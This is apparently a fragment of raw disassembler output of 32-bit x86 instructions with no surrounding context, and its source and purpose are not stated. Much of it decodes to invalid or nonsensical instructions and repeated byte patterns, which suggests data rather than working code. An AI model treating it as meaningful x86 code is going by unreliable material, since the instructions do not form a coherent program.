  419d59:	add    eax,0x41784062
  419d5e:	inc    eax
  419d5f:	inc    eax
  419d60:	add    BYTE PTR [edi],cl
  419d62:	bound  eax,QWORD PTR [ebx+0x0]
  419d65:	add    eax,0x25006240
  419d6a:	inc    eax
  419d6b:	add    eax,0x40254143
  419d70:	add    eax,0x90620000
  419d75:	inc    eax
  419d76:	jmp    0x5240:0x98ffa187
  419d7d:	ret    0x4c65
  419d80:	and    al,0x75
  419d82:	push   edx
  419d83:	push   0xffffffca
  419d85:	ins    BYTE PTR es:[edi],dx
  419d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d87:	ret    
  419d88:	loope  0x419d89
  419d8a:	push   esi
  419d8b:	xchg   esp,eax
  419d8c:	dec    eax
  419d8d:	bound  ecx,QWORD PTR ds:0xac48adde
  419d93:	add    eax,0xb0144215
  419d98:	ja     0x419dd9
  419d9a:	xor    eax,0xf6d1c8cb
  419d9f:	cmp    BYTE PTR [ebx+0x60909848],bl
  419da5:	(bad)  
  419da6:	stc    
  419da7:	mov    cl,0xe5
  419da9:	aas    
  419daa:	push   edx
  419dab:	inc    ecx
  419dac:	add    BYTE PTR [ebx+0x0],0x0
  419db0:	add    BYTE PTR [ecx+0x40],al
  419db3:	bound  esp,QWORD PTR [esi+0x0]
  419db6:	inc    eax
  419db7:	add    eax,0x5400000
  419dbc:	inc    ecx
  419dbd:	inc    eax
  419dbe:	inc    eax
  419dbf:	bound  esp,QWORD PTR ds:0x25050043
  419dc5:	inc    ecx
  419dc6:	inc    ebx
  419dc7:	inc    eax
  419dc8:	test   BYTE PTR [eax+0x0],al
  419dcb:	bound  ebx,QWORD PTR [eax+0x62]
  419dce:	inc    ecx
  419dcf:	inc    eax
  419dd0:	dec    edi
  419dd1:	mov    ds:0x487523d7,al
  419dd6:	inc    edx
  419dd7:	ret    
  419dd8:	inc    eax
  419dd9:	popa   
  419dda:	call   0xc0de9d14
  419ddf:	dec    eax
  419de0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de1:	mov    dh,0xe9
  419de3:	aas    
  419de4:	mov    edi,0x43155744
  419de9:	mov    al,ds:0x2c4f677d
  419dee:	adc    BYTE PTR [edx+0x40],ah
  419df1:	inc    ecx
  419df2:	and    eax,0x40000500
  419df7:	inc    ebx
  419df8:	add    eax,0x40624041
  419dfd:	inc    ebx
  419dfe:	add    eax,0x43402541
  419e03:	bound  eax,QWORD PTR [eax+0x43]
  419e06:	int3   
  419e07:	inc    eax
  419e08:	bound  eax,QWORD PTR [eax]
  419e0a:	inc    ecx
  419e0b:	inc    eax
  419e0c:	inc    eax
  419e0d:	add    eax,0xefe2405
  419e12:	cmp    bh,BYTE PTR [esi-0x5e]
  419e15:	push   ecx
  419e16:	add    BYTE PTR [edx+0x4f],ah
  419e19:	rol    BYTE PTR [ebp+0x62247421],0xb7
  419e20:	dec    edx
  419e21:	imul   esp,DWORD PTR [esi+0x59],0x4062f150
  419e28:	and    eax,0x5406600
  419e2d:	inc    ebx
  419e2e:	inc    ecx
  419e2f:	inc    eax
  419e30:	inc    eax
  419e31:	inc    ebx
  419e32:	add    BYTE PTR [eax],al
  419e34:	add    BYTE PTR [edx-0x34],ah
  419e37:	inc    eax
  419e38:	add    eax,0x40004041
  419e3d:	inc    ecx
  419e3e:	int3   
  419e3f:	add    BYTE PTR [ebx-0x7c],al
  419e42:	add    eax,0x5406240
  419e47:	bound  ecx,QWORD PTR ds:0x9ea43fa8
  419e4d:	inc    ebp
  419e4e:	lods   eax,DWORD PTR ds:[esi]
  419e4f:	inc    eax
  419e50:	data16 adc bl,BYTE PTR [edx]
  419e53:	push   cs
  419e54:	pop    edx
  419e55:	retf   0xd24e
  419e58:	xor    eax,0xbdc1b99c
  419e5d:	push   edx
  419e5e:	inc    eax
  419e5f:	bound  ebx,QWORD PTR [eax+0x41]
  419e62:	add    eax,0x40404340
  419e67:	inc    ebx
  419e68:	inc    eax
  419e69:	test   BYTE PTR [eax],al
  419e6b:	add    eax,0x40624041
  419e70:	inc    eax
  419e71:	add    BYTE PTR [edx+0x5],ah
  419e74:	inc    ebx
  419e75:	add    BYTE PTR [eax+0x78],al
  419e78:	inc    ecx
  419e79:	add    BYTE PTR [eax+0x41],bl
  419e7c:	bound  ebp,QWORD PTR [ecx-0x3cbd67d7]
  419e82:	arpl   WORD PTR [eax+ebp*1-0x15ada2b1],bx
  419e89:	dec    eax
  419e8a:	jbe    0x419ee0
  419e8c:	cs and edx,ecx
  419e8f:	jmp    0x419e31
  419e91:	or     eax,0xc71ba58c
  419e96:	imul   ecx,DWORD PTR [edx+eiz*2-0xd656302],0x61
  419e9e:	push   ebx
  419e9f:	inc    eax
  419ea0:	test   BYTE PTR [eax],al
  419ea2:	int3   
  419ea3:	bound  eax,QWORD PTR ds:0xcc840f41
  419ea9:	inc    ebx
  419eaa:	add    BYTE PTR [eax+0x0],al
  419ead:	inc    eax
  419eae:	inc    eax
  419eaf:	inc    eax
  419eb0:	int3   
  419eb1:	add    BYTE PTR ds:0x62404341,al
  419eb7:	pop    eax
  419eb8:	add    BYTE PTR [ebx+0x40],al
  419ebb:	bound  ecx,QWORD PTR [edi]
  419ebd:	inc    eax
  419ebe:	dec    eax
  419ebf:	(bad)  [edi+0x5]
  419ec2:	adc    eax,0x3c42df48
  419ec7:	mov    esp,0x7c325353
  419ecc:	cmc    
  419ecd:	lock jl 0x419f32
  419ed0:	cmp    al,0x4f
  419ed2:	dec    esi
  419ed3:	inc    ebx
  419ed4:	add    eax,0x143c524
  419ed9:	es fs and DWORD PTR cs:[esi-0x7f472fca],ebp
  419ee2:	cli    
  419ee3:	sub    eax,0x48fe76ff
  419ee8:	ret    
  419ee9:	pop    ss
  419eea:	cwde   
  419eeb:	retf   0xf720
  419eee:	inc    esp
  419eef:	je     0x419f39
  419ef1:	dec    edi
  419ef2:	or     eax,0x2c766c1d
  419ef7:	aad    0x0
  419ef9:	add    BYTE PTR [eax+0x40],al
  419efc:	cmovno eax,DWORD PTR ds:0x40056243
  419f03:	int3   
  419f04:	add    ah,cl
  419f06:	inc    eax
  419f07:	inc    eax
  419f08:	bound  eax,QWORD PTR [ecx+0x0]
  419f0b:	add    BYTE PTR [edi],cl
  419f0d:	inc    ebx
  419f0e:	inc    eax
  419f0f:	inc    eax
  419f10:	add    BYTE PTR [ecx+0x43],al
  419f13:	add    eax,0x40256240
  419f18:	bound  eax,QWORD PTR [eax]
  419f1a:	add    eax,0x67e34126
  419f1f:	(bad)  
  419f20:	jp     0x419f2c
  419f22:	inc    BYTE PTR [esi-0x3d]
  419f25:	pop    ds
  419f26:	inc    ebx
  419f27:	jbe    0x419f14
  419f29:	lock dec edi
  419f2b:	or     al,0x35
  419f2d:	push   0x21
  419f2f:	jmp    FWORD PTR [ebp-0x66f534c]
  419f35:	jecxz  0x419f8e
  419f37:	jbe    0x419f6e
  419f39:	test   al,0xcb
  419f3b:	rcl    DWORD PTR [esi-0x67009d65],0x73
  419f42:	adc    eax,0x2796059c
  419f47:	sbb    dl,BYTE PTR [edx+0xa]
  419f4a:	dec    esi
  419f4b:	mov    eax,0x52a41
  419f50:	int3   
  419f51:	inc    eax
  419f52:	inc    ecx
  419f53:	inc    eax
  419f54:	inc    ebx
  419f55:	bound  esp,QWORD PTR ds:0x41400043
  419f5b:	add    BYTE PTR [eax],al
  419f5d:	add    eax,0x43624062
  419f62:	inc    ecx
  419f63:	inc    eax
  419f64:	inc    eax
  419f65:	inc    eax
  419f66:	add    eax,0x40624340
  419f6b:	add    eax,0x40664140
  419f70:	dec    edx
  419f71:	aas    
  419f72:	mov    eax,ds:0x48bb4062
  419f77:	lahf   
  419f78:	popa   
  419f79:	je     0x419f23
  419f7b:	xchg   ecx,eax
  419f7c:	inc    ecx
  419f7d:	add    eax,0xa30049dc
  419f82:	xor    eax,0x363c06c
  419f87:	frstor [ecx]
  419f89:	sbb    DWORD PTR [eax-0x7ee97cf],ebx
  419f8f:	pop    edi
  419f90:	pop    ecx
  419f91:	and    dl,BYTE PTR [edx-0x7c]
  419f94:	xchg   esi,eax
  419f95:	pushf  
  419f96:	xchg   esp,eax
  419f97:	aad    0x63
  419f99:	and    DWORD PTR [edi+0x43],ebx
  419f9c:	add    BYTE PTR ds:0x41107840,al
  419fa2:	bound  eax,QWORD PTR [eax+0x40]
  419fa5:	sldt   WORD PTR [eax-0x34]
  419fa9:	js     0x41a00d
  419fab:	add    eax,0x40664143
  419fb0:	inc    ebx
  419fb1:	add    BYTE PTR [ecx+0x5],al
  419fb4:	js     0x419ff6
  419fb6:	bound  eax,QWORD PTR [eax+0x0]
  419fb9:	inc    eax
  419fba:	enter  0x644c,0x54
  419fbe:	pop    edx
  419fbf:	idiv   DWORD PTR [esi+0x45a1428c]
  419fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc6:	dec    esi
  419fc7:	dec    edi
  419fc8:	sbb    BYTE PTR [eax+0x36],cl
  419fcb:	sbb    ebp,0x21a1ab92
  419fd1:	cmp    al,0x65
  419fd3:	jnp    0x41a01b
  419fd5:	or     eax,0x745011ef
  419fda:	inc    ecx
  419fdb:	inc    ebx
  419fdc:	inc    eax
  419fdd:	inc    eax
  419fde:	add    eax,0x434162
  419fe3:	inc    eax
  419fe4:	add    BYTE PTR [edx+0x5],ah
  419fe7:	inc    eax
  419fe8:	adc    BYTE PTR [edx+0x40],ah
  419feb:	inc    ebx
  419fec:	inc    ecx
  419fed:	add    eax,0x4340
  419ff2:	add    eax,0x404162
  419ff7:	add    BYTE PTR [eax+0x43],al
  419ffa:	inc    eax
  419ffb:	add    eax,0x32d045ef
  41a000:	pop    ebp
  41a001:	in     eax,0x77
  41a003:	pushf  
  41a004:	in     eax,0x2e
  41a006:	adc    eax,0x500c2382
  41a00b:	mov    ecx,0x64e86234
  41a010:	outs   dx,DWORD PTR ds:[esi]
  41a011:	mov    eax,ds:0x407a357f
  41a016:	add    BYTE PTR [eax],al
  41a018:	inc    ecx
  41a019:	inc    ebx
  41a01a:	add    eax,0x41784062
  41a01f:	inc    eax
  41a020:	inc    eax
  41a021:	add    BYTE PTR [edi],cl
  41a023:	bound  eax,QWORD PTR [ebx+0x0]
  41a026:	add    eax,0x25006240
  41a02b:	inc    eax
  41a02c:	add    eax,0x40254143
  41a031:	add    eax,0x68620000
  41a036:	and    al,0xf9
  41a038:	not    BYTE PTR [eax+edx*2-0x179cc268]
  41a03f:	nop
  41a040:	add    esp,ecx
  41a042:	jg     0x41a096
  41a044:	pop    edi
  41a045:	popa   
  41a046:	jl     0x41a04d
  41a048:	lds    ecx,FWORD PTR [edi+0x7f]
  41a04b:	jmp    0x41a011
  41a04d:	pushf  
  41a04e:	adc    DWORD PTR [ebx+eax*2],edi
  41a051:	add    BYTE PTR [eax],al
  41a053:	add    BYTE PTR [ecx+0x40],al
  41a056:	bound  esp,QWORD PTR [esi+0x0]
  41a059:	inc    eax
  41a05a:	add    eax,0x5400000
  41a05f:	inc    ecx
  41a060:	inc    eax
  41a061:	inc    eax
  41a062:	bound  esp,QWORD PTR ds:0x25050043
  41a068:	inc    ecx
  41a069:	inc    ebx
  41a06a:	inc    eax
  41a06b:	test   BYTE PTR [eax+0x0],al
  41a06e:	bound  ebx,QWORD PTR [eax+0x62]
  41a071:	inc    ecx
  41a072:	inc    eax
  41a073:	aaa    
  41a074:	mov    ds:0x634a8c21,al
  41a079:	inc    ebx
  41a07a:	pop    es
  41a07b:	out    0x9,al
  41a07d:	dec    eax
  41a07e:	push   esi
  41a07f:	enter  0xbc59,0x65
  41a083:	mov    ds:0x7b2ca0ca,eax
  41a088:	inc    ecx
  41a089:	adc    eax,0x2e21b48e
  41a08e:	jo     0x41a10a
  41a090:	adc    BYTE PTR [edx+0x40],ah
  41a093:	inc    ecx
  41a094:	and    eax,0x40000500
  41a099:	inc    ebx
  41a09a:	add    eax,0x40624041
  41a09f:	inc    ebx
  41a0a0:	add    eax,0x43402541
  41a0a5:	bound  eax,QWORD PTR [eax+0x43]
  41a0a8:	int3   
  41a0a9:	inc    eax
  41a0aa:	bound  eax,QWORD PTR [eax]
  41a0ac:	inc    ecx
  41a0ad:	inc    eax
  41a0ae:	inc    eax
  41a0af:	add    eax,0x38423d05
  41a0b4:	cld    
  41a0b5:	push   esi
  41a0b6:	adc    eax,0xc169fdc5
  41a0bb:	cmc    
  41a0bc:	push   0x88cea1b3
  41a0c1:	sbb    al,0x98
  41a0c3:	dec    si
  41a0c5:	mov    ebx,0x8405bebd
  41a0ca:	bound  ecx,QWORD PTR [eax+esi*4-0x349aab3a]
  41a0d1:	(bad)  
  41a0d2:	mov    esp,0x20a19b33
  41a0d7:	xor    eax,0x4062ec5e
  41a0dc:	and    eax,0x5406600
  41a0e1:	inc    ebx
  41a0e2:	inc    ecx
  41a0e3:	inc    eax
  41a0e4:	inc    eax
  41a0e5:	inc    ebx
  41a0e6:	add    BYTE PTR [eax],al
  41a0e8:	add    BYTE PTR [edx-0x34],ah
  41a0eb:	inc    eax
  41a0ec:	add    eax,0x40004041
  41a0f1:	inc    ecx
  41a0f2:	int3   
  41a0f3:	add    BYTE PTR [ebx-0x7c],al
  41a0f6:	add    eax,0x5406240
  41a0fb:	bound  esi,QWORD PTR [edi-0x47]
  41a0fe:	int3   
  41a0ff:	or     BYTE PTR [edi],bl
  41a101:	cwde   
  41a102:	aas    
  41a103:	push   esi
  41a104:	pop    ebp
  41a105:	mov    sp,WORD PTR [ebx+0x4b6f524e]
  41a10c:	arpl   WORD PTR [edx+0x5f61445f],cx
  41a112:	stos   DWORD PTR es:[edi],eax
  41a113:	fcom   QWORD PTR [ebp+0x5]
  41a116:	cmp    esp,DWORD PTR [ecx-0x8bb73bf]
  41a11c:	stos   DWORD PTR es:[edi],eax
  41a11d:	lds    esi,FWORD PTR [eax]
  41a11f:	or     esp,DWORD PTR [eax-0x6]
  41a122:	xor    cl,BYTE PTR [edi-0x80]
  41a125:	inc    eax
  41a126:	bound  ebx,QWORD PTR [eax+0x41]
  41a129:	add    eax,0x40404340
  41a12e:	inc    ebx
  41a12f:	inc    eax
  41a130:	test   BYTE PTR [eax],al
  41a132:	add    eax,0x40624041
  41a137:	inc    eax
  41a138:	add    BYTE PTR [edx+0x5],ah
  41a13b:	inc    ebx
  41a13c:	add    BYTE PTR [eax+0x78],al
  41a13f:	inc    ecx
  41a140:	add    BYTE PTR [eax+0x41],bl
  41a143:	bound  edx,QWORD PTR [esi+0x3525615c]
  41a149:	xchg   esp,eax
  41a14a:	jnp    0x41a1bf
  41a14c:	gs ja  0x41a197
  41a14f:	ss cdq 
  41a151:	rol    BYTE PTR [ecx+0x44],0x88
  41a155:	pop    ds
  41a156:	mov    ds:0x3f3552e3,al
  41a15b:	xor    eax,0x5b290515
  41a160:	iret   
  41a161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a162:	ins    BYTE PTR es:[edi],dx
  41a163:	inc    ebx
  41a164:	dec    ebx
  41a165:	stos   BYTE PTR es:[edi],al
  41a166:	mov    ah,BYTE PTR [edx+0x69217b34]
  41a16c:	out    0xad,al
  41a16e:	loope  0x41a1d2
  41a170:	lds    ax,DWORD PTR [ecx+0x28]
  41a174:	cli    
  41a175:	aas    
  41a176:	dec    eax
  41a177:	inc    eax
  41a178:	test   BYTE PTR [eax],al
  41a17a:	int3   
  41a17b:	bound  eax,QWORD PTR ds:0xcc840f41
  41a181:	inc    ebx
  41a182:	add    BYTE PTR [eax+0x0],al
  41a185:	inc    eax
  41a186:	inc    eax
  41a187:	inc    eax
  41a188:	int3   
  41a189:	add    BYTE PTR ds:0x62404341,al
  41a18f:	pop    eax
  41a190:	add    BYTE PTR [ebx+0x40],al
  41a193:	bound  ecx,QWORD PTR [edi]
  41a195:	inc    eax
  41a196:	div    BYTE PTR ds:0x86483d2b
  41a19c:	xor    ah,dl
  41a19e:	xchg   edx,eax
  41a19f:	cwde   
  41a1a0:	fsubr  DWORD PTR [ecx+0x6b]
  41a1a3:	dec    edx
  41a1a4:	pusha  
  41a1a5:	mov    ebx,0xcc625220
  41a1aa:	fucom  st(2)
  41a1ac:	xor    al,0x67
  41a1ae:	sub    eax,0x57445e6d
  41a1b3:	pop    ss
  41a1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1b5:	inc    ebx
  41a1b6:	jb     0x41a1a4
  41a1b8:	mov    BYTE PTR [edx+0x4],al
  41a1bb:	add    BYTE PTR [eax],al
  41a1bd:	inc    eax
  41a1be:	inc    eax
  41a1bf:	cmovno eax,DWORD PTR ds:0x40056243
  41a1c6:	int3   
  41a1c7:	add    ah,cl
  41a1c9:	inc    eax
  41a1ca:	inc    eax
  41a1cb:	bound  eax,QWORD PTR [ecx+0x0]
  41a1ce:	add    BYTE PTR [edi],cl
  41a1d0:	inc    ebx
  41a1d1:	inc    eax
  41a1d2:	inc    eax
  41a1d3:	add    BYTE PTR [ecx+0x43],al
  41a1d6:	add    eax,0x40256240
  41a1db:	bound  eax,QWORD PTR [eax]
  41a1dd:	stc    
  41a1de:	xor    eax,0xc0ee1a5
  41a1e3:	push   eax
  41a1e4:	push   0x55f92884
  41a1e9:	inc    esp
  41a1ea:	dec    esp
  41a1eb:	xchg   edi,eax
  41a1ec:	popa   
  41a1ed:	add    eax,0x2de1e1ca
  41a1f2:	arpl   WORD PTR [ebx+0x491f4114],bp
  41a1f8:	push   esp
  41a1f9:	push   0x4b6845b4
  41a1fe:	out    dx,eax
  41a1ff:	loope  0x41a221
  41a201:	aad    0xe7
  41a203:	stos   DWORD PTR es:[edi],eax
  41a204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a205:	in     al,0x7
  41a207:	dec    ecx
  41a208:	das    
  41a209:	lahf   
  41a20a:	in     eax,dx
  41a20b:	mov    esp,0x21f6f8ab
  41a210:	push   esi
  41a211:	cli    
  41a212:	arpl   WORD PTR [edx-0x44],ax
  41a215:	sbb    BYTE PTR [ebp+0x5],0x0
  41a219:	int3   
  41a21a:	inc    eax
  41a21b:	inc    ecx
  41a21c:	inc    eax
  41a21d:	inc    ebx
  41a21e:	bound  esp,QWORD PTR ds:0x41400043
  41a224:	add    BYTE PTR [eax],al
  41a226:	add    eax,0x43624062
  41a22b:	inc    ecx
  41a22c:	inc    eax
  41a22d:	inc    eax
  41a22e:	inc    eax
  41a22f:	add    eax,0x40624340
  41a234:	add    eax,0x40664140
  41a239:	inc    esi
  41a23a:	out    0xfa,eax
  41a23c:	ins    DWORD PTR es:[edi],dx
  41a23d:	push   0xa3f31529
  41a242:	cwde   
  41a243:	xor    eax,0x4f23f8e0
  41a248:	es inc edx
  41a24a:	loopne 0x41a1e5
  41a24c:	bound  esp,QWORD PTR [edx+0x48]
  41a24f:	neg    DWORD PTR [edx+0x752fbe1]
  41a255:	nop
  41a256:	inc    eax
  41a257:	cli    
  41a258:	test   BYTE PTR [ecx+0x43],0x0
  41a25c:	add    eax,0x41107840
  41a261:	bound  eax,QWORD PTR [eax+0x40]
  41a264:	sldt   WORD PTR [eax-0x34]
  41a268:	js     0x41a2cc
  41a26a:	add    eax,0x40664143
  41a26f:	inc    ebx
  41a270:	add    BYTE PTR [ecx+0x5],al
  41a273:	js     0x41a2b5
  41a275:	bound  eax,QWORD PTR [eax+0x0]
  41a278:	inc    eax
  41a279:	pop    ds
  41a27a:	jo     0x41a238
  41a27c:	jnp    0x41a2eb
  41a27e:	add    BYTE PTR [edi+0x620850e1],0x4c
  41a285:	mov    esp,0x243f4b0d
  41a28a:	xor    ax,0x505
  41a28e:	dec    edi
  41a28f:	inc    edi
  41a290:	je     0x41a301
  41a292:	xor    eax,0xf7cbfea0
  41a297:	adc    ah,BYTE PTR [ecx+0x43]
  41a29a:	cwde   
  41a29b:	fimul  DWORD PTR [edi+0x4d]
  41a29e:	stc    
  41a29f:	ins    BYTE PTR es:[edi],dx
  41a2a0:	or     BYTE PTR ds:0x34517252,ah
  41a2a6:	(bad)  
  41a2a7:	xchg   ebx,eax
  41a2a8:	and    DWORD PTR [esi+eiz*8+0x62],eax
  41a2ac:	inc    BYTE PTR [eax+0x5]
  41a2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b0:	pop    esp
  41a2b1:	pusha  
  41a2b2:	pushf  
  41a2b3:	retf   
  41a2b4:	inc    ebp
  41a2b5:	inc    ecx
  41a2b6:	inc    ebx
  41a2b7:	inc    eax
  41a2b8:	inc    eax
  41a2b9:	add    eax,0x434162
  41a2be:	inc    eax
  41a2bf:	add    BYTE PTR [edx+0x5],ah
  41a2c2:	inc    eax
  41a2c3:	adc    BYTE PTR [edx+0x40],ah
  41a2c6:	inc    ebx
  41a2c7:	inc    ecx
  41a2c8:	add    eax,0x4340
  41a2cd:	add    eax,0x404162
  41a2d2:	add    BYTE PTR [eax+0x43],al
  41a2d5:	inc    eax
  41a2d6:	add    eax,0xe33d3640
  41a2db:	daa    
  41a2dc:	dec    ebp
  41a2dd:	pop    eax
  41a2de:	arpl   WORD PTR [edx],bx
  41a2e0:	jnp    0x41a2b3
  41a2e2:	add    al,0x58
  41a2e4:	sub    al,0x67
  41a2e6:	push   0xa10d650d
  41a2eb:	and    DWORD PTR [edx+0x2a],esp
  41a2ee:	gs mov edx,0x4272c3fc
  41a2f4:	aad    0x5f
  41a2f6:	inc    eax
  41a2f7:	add    BYTE PTR [eax],al
  41a2f9:	inc    ecx
  41a2fa:	inc    ebx
  41a2fb:	add    eax,0x41784062
  41a300:	inc    eax
  41a301:	inc    eax
  41a302:	add    BYTE PTR [edi],cl
  41a304:	bound  eax,QWORD PTR [ebx+0x0]
  41a307:	add    eax,0x25006240
  41a30c:	inc    eax
  41a30d:	add    eax,0x40254143
  41a312:	add    eax,0x58620000
  41a317:	sar    DWORD PTR [eax+ebp*4],0x31
  41a31b:	and    BYTE PTR [ebx-0x34],cl
  41a31e:	arpl   WORD PTR [ecx+0x79],dx
  41a321:	jb     0x41a39c
  41a323:	sbb    edi,esi
  41a325:	shr    BYTE PTR [ecx-0x9],1
  41a328:	data16 mul BYTE PTR [ecx]
  41a32b:	inc    ebx
  41a32c:	add    BYTE PTR [eax],al
  41a32e:	add    BYTE PTR [ecx+0x40],al
  41a331:	bound  esp,QWORD PTR [esi+0x0]
  41a334:	inc    eax
  41a335:	add    eax,0x5400000
  41a33a:	inc    ecx
  41a33b:	inc    eax
  41a33c:	inc    eax
  41a33d:	bound  esp,QWORD PTR ds:0x25050043
  41a343:	inc    ecx
  41a344:	inc    ebx
  41a345:	inc    eax
  41a346:	test   BYTE PTR [eax+0x0],al
  41a349:	bound  ebx,QWORD PTR [eax+0x62]
  41a34c:	inc    ecx
  41a34d:	inc    eax
  41a34e:	and    DWORD PTR [esp+eax*2+0x69],eax
  41a352:	dec    edi
  41a353:	cli    
  41a354:	retf   
  41a355:	jno    0x41a378
  41a357:	sub    al,0x29
  41a359:	dec    edx
  41a35a:	mov    esp,0x61233c4d
  41a35f:	pusha  
  41a360:	into   
  41a361:	inc    esp
  41a362:	or     eax,0x542c1ad
  41a367:	int    0xa8
  41a369:	ins    BYTE PTR es:[edi],dx
  41a36a:	inc    ecx
  41a36b:	clc    
  41a36c:	sub    eax,esp
  41a36e:	mov    eax,ds:0x40721129
  41a373:	inc    esi
  41a374:	in     al,dx
  41a375:	mov    edi,0x34b85e40
  41a37a:	xor    BYTE PTR [ebp+0x55206d0f],0x41
  41a381:	mov    DWORD PTR [esi+esi*8],esi
  41a384:	sub    cl,BYTE PTR [ebx+ebp*1]
  41a387:	xor    eax,0x41406210
  41a38c:	and    eax,0x40000500
  41a391:	inc    ebx
  41a392:	add    eax,0x40624041
  41a397:	inc    ebx
  41a398:	add    eax,0x43402541
  41a39d:	bound  eax,QWORD PTR [eax+0x43]
  41a3a0:	int3   
  41a3a1:	inc    eax
  41a3a2:	bound  eax,QWORD PTR [eax]
  41a3a4:	inc    ecx
  41a3a5:	inc    eax
  41a3a6:	inc    eax
  41a3a7:	add    eax,0xbfc56605
  41a3ac:	adc    eax,0x986321b9
  41a3b1:	loopne 0x41a3ff
  41a3b3:	mov    edi,0xe277532f
  41a3b8:	push   edx
  41a3b9:	fs or  eax,0x2112f6b0
  41a3bf:	outs   dx,BYTE PTR ds:[esi]
  41a3c0:	out    0xf3,al
  41a3c2:	inc    BYTE PTR [eax+0x64]
  41a3c5:	mov    ebx,0x20bc5040
  41a3ca:	dec    edi
  41a3cb:	gs cli 
  41a3cd:	aam    0xa0
  41a3cf:	and    DWORD PTR ds:0xf4407a11,esi
  41a3d5:	mov    fs,WORD PTR [edi]
  41a3d7:	xor    eax,0x46a098
  41a3dc:	or     eax,0x5240fdf6
  41a3e1:	arpl   WORD PTR [bp+si+0x40],sp
  41a3e5:	and    eax,0x5406600
  41a3ea:	inc    ebx
  41a3eb:	inc    ecx
  41a3ec:	inc    eax
  41a3ed:	inc    eax
  41a3ee:	inc    ebx
  41a3ef:	add    BYTE PTR [eax],al
  41a3f1:	add    BYTE PTR [edx-0x34],ah
  41a3f4:	inc    eax
  41a3f5:	add    eax,0x40004041
  41a3fa:	inc    ecx
  41a3fb:	int3   
  41a3fc:	add    BYTE PTR [ebx-0x7c],al
  41a3ff:	add    eax,0x5406240
  41a404:	bound  esi,QWORD PTR [edx]
  41a406:	inc    edx
  41a407:	push   eax
  41a408:	mov    ds:0x1c2ad560,al
  41a40d:	nop
  41a40e:	(bad)  
  41a40f:	xchg   edx,eax
  41a410:	and    DWORD PTR [edi+0x4e],ebp
  41a413:	jnp    0x41a47c
  41a415:	clc    
  41a416:	sub    DWORD PTR [eax+0x5bfd28f6],esp
  41a41c:	mov    cl,0x11
  41a41e:	stc    
  41a41f:	xchg   esp,eax
  41a420:	mov    eax,ds:0xe82148a2
  41a425:	lods   al,BYTE PTR ds:[esi]
  41a426:	repnz add DWORD PTR ds:0x53623c34,esi
  41a42d:	retf   
  41a42e:	add    eax,0x5a2c7ee5
  41a433:	(bad)  
  41a435:	adc    eax,0x41586240
  41a43a:	add    eax,0x40404340
  41a43f:	inc    ebx
  41a440:	inc    eax
  41a441:	test   BYTE PTR [eax],al
  41a443:	add    eax,0x40624041
  41a448:	inc    eax
  41a449:	add    BYTE PTR [edx+0x5],ah
  41a44c:	inc    ebx
  41a44d:	add    BYTE PTR [eax+0x78],al
  41a450:	inc    ecx
  41a451:	add    BYTE PTR [eax+0x41],bl
  41a454:	bound  eax,QWORD PTR [ecx-0x59]
  41a457:	popa   
  41a458:	loope  0x41a4c2
  41a45a:	ins    DWORD PTR es:[edi],dx
  41a45b:	test   al,0x4b
  41a45d:	jge    0x41a403
  41a45f:	jbe    0x41a4d4
  41a461:	in     eax,0x54
  41a463:	(bad)  
  41a464:	adc    al,0xe0
  41a466:	xchg   edi,eax
  41a467:	loop   0x41a48a
  41a469:	bound  di,DWORD PTR [esi+0x48]
  41a46d:	clc    
  41a46e:	or     BYTE PTR [eax+0x63633537],ch
  41a474:	ins    DWORD PTR es:[edi],dx
  41a475:	lock mov WORD PTR [ebx-0x5f],cs
  41a479:	cwde   
  41a47a:	icebp  
  41a47b:	adc    eax,0x22be1543
  41a480:	call   0xf744:0x44dca852
  41a487:	add    DWORD PTR [ecx-0x5b],esp
  41a48a:	adc    ah,BYTE PTR [ecx]
  41a48c:	push   edx
  41a48d:	iret   
  41a48e:	jmp    0x41a45a
  41a490:	out    dx,eax
  41a491:	lods   al,BYTE PTR ds:[esi]
  41a492:	inc    eax
  41a493:	test   BYTE PTR [eax],al
  41a495:	int3   
  41a496:	bound  eax,QWORD PTR ds:0xcc840f41
  41a49c:	inc    ebx
  41a49d:	add    BYTE PTR [eax+0x0],al
  41a4a0:	inc    eax
  41a4a1:	inc    eax
  41a4a2:	inc    eax
  41a4a3:	int3   
  41a4a4:	add    BYTE PTR ds:0x62404341,al
  41a4aa:	pop    eax
  41a4ab:	add    BYTE PTR [ebx+0x40],al
  41a4ae:	bound  ecx,QWORD PTR [edi]
  41a4b0:	inc    eax
  41a4b1:	pushf  
  41a4b2:	or     al,0x44
  41a4b4:	sbb    al,0x18
  41a4b6:	mov    eax,ds:0x67423564
  41a4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4bc:	cli    
  41a4bd:	push   esi
  41a4be:	xor    al,0x62
  41a4c0:	cwde   
  41a4c1:	pop    ebx
  41a4c2:	pop    edi
  41a4c3:	mov    esi,ebp
  41a4c5:	xchg   esp,eax
  41a4c6:	jae    0x41a544
  41a4c8:	push   edx
  41a4c9:	and    BYTE PTR [eax+0x1f860d63],bh
  41a4cf:	adc    ebp,0xd
  41a4d2:	popa   
  41a4d3:	xchg   esi,eax
  41a4d4:	inc    ecx
  41a4d5:	(bad)
  41a4d8:	in     al,0xcb
  41a4da:	sbb    BYTE PTR [ebx+0x38],ah
  41a4dd:	mov    dl,0x97
  41a4df:	xchg   cx,ax
  41a4e1:	adc    BYTE PTR [eax+0x21],ch
  41a4e4:	mov    al,0x7f
  41a4e6:	push   ecx
  41a4e7:	mov    ds:0x62ca8065,eax
  41a4ec:	mov    BYTE PTR fs:[eax],0x0
  41a4f0:	inc    eax
  41a4f1:	inc    eax
  41a4f2:	cmovno eax,DWORD PTR ds:0x40056243
  41a4f9:	int3   
  41a4fa:	add    ah,cl
  41a4fc:	inc    eax
  41a4fd:	inc    eax
  41a4fe:	bound  eax,QWORD PTR [ecx+0x0]
  41a501:	add    BYTE PTR [edi],cl
  41a503:	inc    ebx
  41a504:	inc    eax
  41a505:	inc    eax
  41a506:	add    BYTE PTR [ecx+0x43],al
  41a509:	add    eax,0x40256240
  41a50e:	bound  eax,QWORD PTR [eax]
  41a510:	loope  0x41a591
